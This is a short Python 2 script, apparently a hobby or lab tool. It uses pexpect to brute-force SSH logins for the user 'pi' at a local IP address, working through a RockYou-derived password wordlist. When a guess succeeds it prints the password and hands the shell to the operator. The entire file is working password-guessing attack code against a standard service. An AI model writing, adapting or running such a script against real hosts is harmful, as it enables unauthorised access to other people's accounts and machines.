#!/usr/bin/python2

import pexpect, sys, time 

#this is the username information and the IP address of the host 

startTime = time.time()
password = 'cleaneduprockyou.txt'
user = 'pi'
host = '192.168.0.36'
passwds = []


#def findpassword(passwds,password):
passwordfile = open(password,"r")
linenum = 1
for password in passwordfile:
	password.strip()
	passwds.append(password)
	linenum +=1
	
	
#print "The list of passwords is " + str(len(passwds)) + " long"
	
def trylogin(user, host, passwds):

	conStr = 'ssh ' + user + '@' + host 

	print "Connecting with command line:", conStr 

	child = pexpect.spawn(conStr)
	for pas in passwds:
		#look for the password prompt 
		ret = child.expect(['password:', pexpect.EOF])
		if ret == 1: 
			print "disconnected" 
			sys.exit(1)

		child.sendline(str(pas))
		#look for the prompt to know that I've logged in
		ret = child.expect(['\$', 'Permission'])
		
		if ret == 0: 
			#print "Running"
			#if it gets this far you have succeded 
			print("Found the command prompt! we're in!")
			print "The password is: " + pas
			child.sendline()
			child.interact() #gives the screen adn keyboard to the user.
		if ret == 1: 
			child = pexpect.spawn(conStr)
			print pas
				#print "All passwords have been tired"
	
trylogin(user,host,passwds)

endTime = time.time()

totalSeconds = endTime - startTime




